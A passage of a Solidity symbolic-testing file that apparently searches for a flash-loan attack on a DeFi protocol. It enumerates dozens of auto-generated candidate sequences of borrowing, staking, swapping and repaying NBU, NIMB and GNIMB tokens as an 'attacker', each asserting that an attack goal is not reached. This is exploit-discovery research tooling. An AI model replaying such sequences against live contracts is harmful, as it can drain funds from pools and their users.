        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4065(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4066(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4067(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4068(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4069(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4070(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4071(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4072(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4073(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4074(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4075(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4076(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4077(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4078(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4079(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4080(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4081(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4082(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4083(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4084(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4085(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4086(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4087(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4088(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4089(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4090(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4091(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4092(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4093(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4094(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4095(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4096(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4097(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4098(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4099(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4100(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4101(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4102(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4103(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4104(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4105(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4106(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4107(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4108(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4109(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4110(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
